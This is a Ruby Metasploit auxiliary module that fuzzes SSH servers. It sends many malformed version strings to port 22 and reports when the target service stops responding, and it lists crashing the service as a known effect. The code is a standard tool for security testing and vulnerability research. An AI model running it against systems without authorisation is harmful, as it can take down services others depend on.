##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'English'
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Fuzzer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SSH 2.0 Version Fuzzer',
        'Description' => %q{
          This module sends a series of SSH requests with malicious version strings.
        },
        'Author' => [ 'hdm' ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
    register_options([
      Opt::RPORT(22)
    ])
  end

  def do_ssh_version(pkt, opts = {})
    @connected = false
    connect
    @connected = true

    @banner = sock.get_once(-1, opts[:banner_timeout])
    return if !@banner

    sock.put("#{pkt}\r\n")
  end

  def run
    last_str = nil
    last_inp = nil
    last_err = nil

    make_ssh_version_base
    cnt = 0

    fuzz_strings do |str|
      cnt += 1

      if (cnt % 100 == 0)
        print_status("Fuzzing with iteration #{cnt} using #{@last_fuzzer_input}")
      end

      begin
        do_ssh_version(str, banner_timeout: 5)
      rescue ::Interrupt
        print_status("Exiting on interrupt: iteration #{cnt} using #{@last_fuzzer_input}")
        raise $ERROR_INFO
      rescue StandardError => e
        last_err = e
      ensure
        disconnect
      end

      if !@connected
        if last_str
          print_status("The service may have crashed: iteration:#{cnt - 1} method=#{last_inp} string=#{last_str.unpack('H*')[0]} error=#{last_err}")
        else
          print_status("Could not connect to the service: #{last_err}")
        end
        return
      end

      if !@banner
        print_status("The service may have crashed (no banner): iteration:#{cnt - 1} method=#{last_inp} string=#{last_str.unpack('H*')[0]} ")
        return
      end

      last_str = str
      last_inp = @last_fuzzer_input
    end
  end

  def make_ssh_version_base
    'SSH-2.0-'
  end
end
